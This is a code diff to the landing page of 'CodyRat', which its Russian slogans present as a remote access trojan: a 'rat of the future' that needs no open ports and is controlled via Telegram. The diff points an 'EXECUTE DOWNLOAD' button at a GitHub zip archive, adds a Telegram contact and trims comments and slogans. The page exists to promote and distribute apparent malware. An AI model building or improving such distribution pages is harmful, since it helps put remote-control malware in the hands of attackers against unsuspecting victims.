@@ -23,7 +23,7 @@
     <div class="ui">
         <div class="header">CodyRat</div>
         <div class="typewriter" id="text"></div>
-        <button class="btn" onclick="window.location.href='ссылка'">EXECUTE DOWNLOAD</button>
+        <button class="btn" onclick="window.location.href='https://github.com/unt1tledead/codyrat/raw/main/Kakashki.zip'">EXECUTE DOWNLOAD</button>
     </div>
     <div class="tg-container">
         <a href="https://t.me/mynewdead" class="tg">TG: @mynewdead</a>
@@ -56,7 +56,6 @@
         }
         
         function draw() {
-            // Очищаем только область молнии или перерисовываем фон один раз
             ctx.fillStyle = '#050505'; 
             ctx.fillRect(0, 0, width, height);
             
@@ -82,7 +81,7 @@
         }
         draw();
         
-        const texts = ["Бот билдер для ратников", "Ратник будущего", "Работает без портов", "Управление через телеграм"];
+        const texts = ["Ратник будущего", "Работает без портов", "Управление через телеграм"];
         let i = 0, j = 0, del = false, pause = false;
         
         function type() {
@@ -106,7 +105,7 @@
                         pause = false; 
                         del = true; 
                         type();
-                    }, 1000); // Задержка 1 секунда
+                    }, 1000); 
                 } 
                 else if (del && j === 0) {
                     del = false;
